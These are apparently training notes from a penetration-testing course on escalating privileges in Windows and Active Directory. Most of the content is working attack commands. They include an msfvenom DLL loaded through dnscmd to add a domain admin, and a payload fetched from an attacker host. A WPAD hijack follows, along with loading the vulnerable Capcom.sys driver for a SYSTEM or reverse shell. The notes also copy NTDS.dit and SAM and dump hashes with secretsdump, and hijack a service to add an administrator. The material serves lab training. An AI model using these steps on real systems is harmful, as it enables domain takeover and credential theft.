cmd /c dir /q 'C:\Department Shares\Private\IT'
```

### **Taking Ownership of the File**

```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

### **Confirming Ownership Changed**

```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

### **Modifying the File ACL**

```powershell-session
cat 'C:\Department Shares\Private\IT\cred.txt'
```

> Let's grant our user full privileges over the target file.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

### **Reading the File**

```powershell-session
cat 'C:\Department Shares\Private\IT\cred.txt'
```

## When to Use?

### **Files of Interest**

Some local files of interest may include:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

> We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.


# Attacking Windows Group Privileges

## 1.Windows Built-in Groups

* <https://ss64.com/nt/syntax-security_groups.html>
* <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory>

## Backup Operators

```
whoami /groups
```

> <https://github.com/giuliano108/SeBackupPrivilege>

### **Importing Libraries**

```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### **Verifying SeBackupPrivilege is Enabled**

> Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.<br>
>
> Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

```powershell-session
PS C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell-session
PS C:\adip> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

### **Enabling SeBackupPrivilege**

```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```

```powershell-session
PS C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### **Copying a Protected File**

```powershell-session
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
```

```powershell-session
PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'
```

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

```powershell-session
PS C:\htb>  cat .\Contract.txt
```

### **Attacking a Domain Controller - Copying NTDS.dit**

```powershell-session
PS C:\adip> diskshadow.exe
```

```powershell-session
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

### **Copying NTDS.dit Locally**

```powershell-session
PS C:\adip> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### **Backing up SAM and SYSTEM Registry Hives**

```cmd-session
C:\adip> reg save HKLM\SYSTEM SYSTEM.SAV
C:\adip> reg save HKLM\SAM SAM.SAV
```

### **Extracting Credentials from NTDS.dit**

```powershell-session
PS C:\adip> Import-Module .\DSInternals.psd1
PS C:\adip> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\adip> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### **Extracting Hashes Using SecretsDump**

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Robocopy

### **Copying Files with Robocopy**

```cmd-session
C:\adip> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

***

## 2.Event Log Readers

### **Confirming Group Membership**

```cmd-session
C:\adip> net localgroup "Event Log Readers"
```

### **Searching Security Logs Using wevtutil**

```powershell-session
PS C:\adip> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

### **Passing Credentials to wevtutil**

```cmd-session
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

> Note: Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.

### **Searching Security Logs Using Get-WinEvent**

```powershell-session
PS C:\adip> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

***

## 3.DnsAdmins

> Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):
>
> * DNS management is performed over RPC
> * [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
> * When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
> * When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
> * An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
>
> Let's step through the attack.

## Leveraging DnsAdmins Access

### **Generating Malicious DLL**

```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### **Starting Local HTTP Server**

```shell-session
python3 -m http.server 7777
```

### **Downloading File to Target**

```powershell-session
PS C:\adip>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

### **Loading DLL as Non-Privileged User**

```cmd-session
C:\adip> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

### **Loading DLL as Member of DnsAdmins**

```powershell-session
C:\adip> Get-ADGroupMember -Identity DnsAdmins
```

### **Loading Custom DLL**

```cmd-session
C:\adip> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

> Note: We must specify the full path to our custom DLL or the attack will not work properly.

> Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.
>
> With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
>
> After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.

### **Finding User's SID**

```cmd-session
C:\adip wmic useraccount where name="netadm" get sid
```

### **Checking Permissions on DNS Service**

> Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

```cmd-session
C:\adip> sc.exe sdshow DNS
```

### **Stopping the DNS Service**

```cmd-session
C:\adip> sc stop dns
```

> The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).

### Starting the DNS Service

```cmd-session
C:\adip> sc start dns
```

### **Confirming Group Membership**

```cmd-session
C:\adip> net group "Domain Admins" /dom
```

## Cleaning Up

### **Confirming Registry Key Added**

```cmd-session
C:\adip> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### **Deleting Registry Key**

```cmd-session
C:\adip> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

### **Starting the DNS Service Again**

```cmd-session
C:\adip> sc.exe start dns
```

### **Checking DNS Service Status**

```cmd-session
C:\adip> sc query dns
```

> Once again, this is a potentially destructive attack that we should only carry out with explicit permission from and in coordination with our client. If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.

## Using Mimilib.dll

> As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

> Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.
>
> After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

### **Disabling the Global Query Block List**

```powershell-session
C:\adip> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### **Adding a WPAD Record**

```powershell-session
C:\adip> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

***

## 4.Hyper-V Administrators

> The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
>
> It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.
>
> If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

## **Target File**

> An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:

```shell-session
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

### **Taking Ownership of the File**

```cmd-session
C:\adip> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

### **Starting the Mozilla Maintenance Service**

```cmd-session
C:\adip> sc.exe start MozillaMaintenance
```

> Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.

## 5.Print Operators

> [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

### **Confirming Privileges**

```cmd-session
C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

### **Checking Privileges Again**

> The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.

```cmd-session
C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

> It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
>
> Download it locally and edit it, pasting over the includes below.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

> Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.

### **Compile with cl.exe**

```cmd-session
C:\Users\adip\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

### **Add Reference to Driver**

> Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY\_CURRENT\_USER tree.

```cmd-session
C:\adip> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

C:\adip> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

> The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

### **Verify Driver is not Loaded**

> Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell-session
PS C:\adip> .\DriverView.exe /stext drivers.txt
PS C:\adip> cat drivers.txt | Select-String -pattern Capcom
```

### **Verify Privilege is Enabled**

> Run the `EnableSeLoadDriverPrivilege.exe` binary.

```cmd-session
C:\adip> EnableSeLoadDriverPrivilege.exe
```

```cmd-session
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

### **Verify Capcom Driver is Listed**

```powershell-session
PS C:\adip> .\DriverView.exe /stext drivers.txt
PS C:\adip> cat drivers.txt | Select-String -pattern Capcom
```

### **Use ExploitCapcom Tool to Escalate Privileges**

> To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell-session
PS C:\adip> .\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyP695rM4dWatZexTZGiS%2Fimage.png?alt=media&amp;token=f9430b81-ecf2-41bf-9c91-d09d3b7305e8" alt=""><figcaption></figcaption></figure>

## Alternate Exploitation - No GUI

> If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

> The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

> We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

## Automating the Steps

### **Automating with EopLoadDriver**

> We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

```cmd-session
C:\adip> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

> We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

## Clean-up

### **Removing Registry Key**

```cmd-session
C:\adip> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

***

## 6.Server Operators

> The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
>
> Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

### **Querying the AppReadiness Service**

```cmd-session
C:\htb> sc qc AppReadiness
```

### **Checking Service Permissions with PsService**

> We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```cmd-session
C:\htb> c:\Tools\PsService.exe security AppReadiness
```

> This confirms that the Server Operators group has [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

### **Checking Local Admin Group Membership**

```cmd-session
C:\adip> net localgroup Administrators
```

### **Modifying the Service Binary Path**

```cmd-session
C:\adip> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

### **Starting the Service**

```cmd-session
C:\adip> sc start AppReadiness
```

### **Confirming Local Admin Group Membership**

```cmd-session
C:\adip> net localgroup Administrators
```

### **Confirming Local Admin Access on Domain Controller**

```shell-session
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

### **Retrieving NTLM Password Hashes from the Domain Controller**

```shell-session
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

# Attacking the OS

## 1.User Account Control

> [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. Applications have different `integrity` levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
>
> When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.
>
> This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FRjprzICXxmU8sBurKZ1P%2Fimage.png?alt=media&amp;token=a583dabd-720b-47fe-a43b-7f6731241baf" alt=""><figcaption></figcaption></figure>

> UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.
>
> The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account `sarah` is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.

### **Checking Current User**

```cmd-session
C:\adip> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

### **Confirming Admin Group Membership**

```cmd-session
C:\adip> net localgroup administrators
```

### **Reviewing User Privileges**

```cmd-session
C:\adip> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### **Confirming UAC is Enabled**

```cmd-session
C:\adip> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

### **Checking UAC Level**

```cmd-session
C:\adip> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

> The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

### **Checking Windows Version**

```powershell-session
PS C:\adip> [environment]::OSVersion.Version
```

> This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.
>
> <p align="center"><img src="https://academy.hackthebox.com/storage/modules/67/build.png" alt="Table of Windows versions with details: Version 1507 to 2004, codenames Threshold 1 to 20H1, builds 10240 to 19041, marketing names from N/A to TBA, release dates from July 29, 2015, to first half of 2020." data-size="original"></p>
>
